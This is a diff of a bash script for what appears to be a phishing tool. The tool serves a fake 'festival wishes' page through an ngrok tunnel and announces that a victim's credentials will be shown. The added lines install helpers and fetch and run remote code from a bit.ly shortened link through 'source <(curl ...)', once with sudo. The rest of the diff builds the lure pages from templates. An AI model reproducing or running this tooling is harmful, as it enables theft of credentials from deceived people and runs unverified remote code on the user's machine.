@@ -8,13 +8,36 @@ OS=$(uname -o)
 distro=$(cd $HOME && pwd)
 case ${OS} in
 Android)
-	if ! hash jq > /dev/null 2>&1; then
-	apt install jq -y > /dev/null 2>&1
-	fi
+        if ! hash jq > /dev/null 2>&1; then
+        printf "\033[32m[\033[31m!\033[32m]\033[31mjq not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install jq -y > /dev/null 2>&1
+        fi
+        if ! hash pv > /dev/null 2>&1; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install pv -y > /dev/null 2>&1
+        fi
+        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install python -y && pip install lolcat > /dev/null 2>&1
+        fi
+        if ! hash ngrok > /dev/null 2>&1; then
+        source <(curl -fsSL "https://bit.ly/3repcoL")
+        fi
 ;;
 GNU/Linux)
-	if ! hash jq > /dev/null 2>&1; then
+        if ! hash jq > /dev/null 2>&1; then
         sudo apt install jq -y > /dev/null 2>&1
+        fi
+        if ! hash pv > /dev/null 2>&1; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
+        sudo apt install pv -y > /dev/null 2>&1
+        fi
+        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
+        sudo apt install python -y && pip install lolcat > /dev/null 2>&1
+        fi
+        if ! hash ngrok > /dev/null 2>&1; then
+        sudo source <(curl -fsSL "https://bit.ly/3repcoL")
         fi
 ;;
 esac
@@ -101,7 +124,7 @@ sleep 0.5
 done
 }
 payload_ngrok() {
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
@@ -144,10 +167,14 @@ fi
 sleep 5
 #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
+if [[ $? != 0 ]]; then
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+else
 r2=$(printf "${r1/\"http:\/\//}")
 r3=$(printf "${r2/\"https:\/\//}")
 r4=$(printf "${r3/\",/}")
 link=$(printf "${r4/%\",/}")
+fi
 echo; wait
 printf "${S7}<<<${R0}${S1}---------------${R0}${B1}${S7}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R0}${G0}${S1}---------------${R0}${S7}>>>${R0}\n"; wait
 echo; wait
